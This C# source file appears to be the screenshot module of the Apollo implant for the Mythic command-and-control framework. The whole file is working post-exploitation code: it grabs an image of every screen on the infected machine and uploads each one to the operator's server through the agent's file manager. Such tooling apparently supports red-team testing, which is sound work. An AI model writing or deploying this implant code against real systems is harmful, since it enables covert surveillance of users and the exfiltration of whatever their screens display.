#define COMMAND_NAME_UPPER

#if DEBUG
#define SCREENSHOT
#endif

#if SCREENSHOT
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using ApolloInterop.Utils;

namespace Tasks
{
    public class screenshot : Tasking
    {
        public screenshot(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp = CreateTaskResponse("", true);
            try
            {
                //foreach screen in all screens, pass it to the GetBytesFromScreen function and then put the output into a list
                List<byte[]> captures = Screen.AllScreens.Select(GetBytesFromScreen).ToList();

                foreach (byte[] bScreen in captures)
                {
                    bool putFile = _agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, bScreen, null, out string mythicFileId, true);
                    if (putFile is false)
                    {
                        //if we can't put the file, then we need to break out of the loop and return an error
                        DebugHelp.DebugWriteLine("put file failed");
                        resp = CreateTaskResponse("", true, "error");
                        break;
                    }
                    //add the valid mythicFileId to the response and then add it to the queue
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(mythicFileId, false, ""));
                }
                //if this is reached without the loop breaking then it will be a success state
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }
            catch (Exception e)
            {
                DebugHelp.DebugWriteLine(e.Message);
                DebugHelp.DebugWriteLine(e.StackTrace);
                resp = CreateTaskResponse(e.Message, true, "error");
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }
        }

        private byte[] GetBytesFromScreen(Screen screen)
        {
            using Bitmap bmpScreenCapture = new(screen.Bounds.Width, screen.Bounds.Height);
            using Graphics g = Graphics.FromImage(bmpScreenCapture);
            using MemoryStream ms = new();

            g.CopyFromScreen(new Point(screen.Bounds.X, screen.Bounds.Y), Point.Empty, bmpScreenCapture.Size);
            bmpScreenCapture.Save(ms, ImageFormat.Png);
            byte[] bScreen = ms.ToArray();

            return bScreen;
        }
    }
}
#endif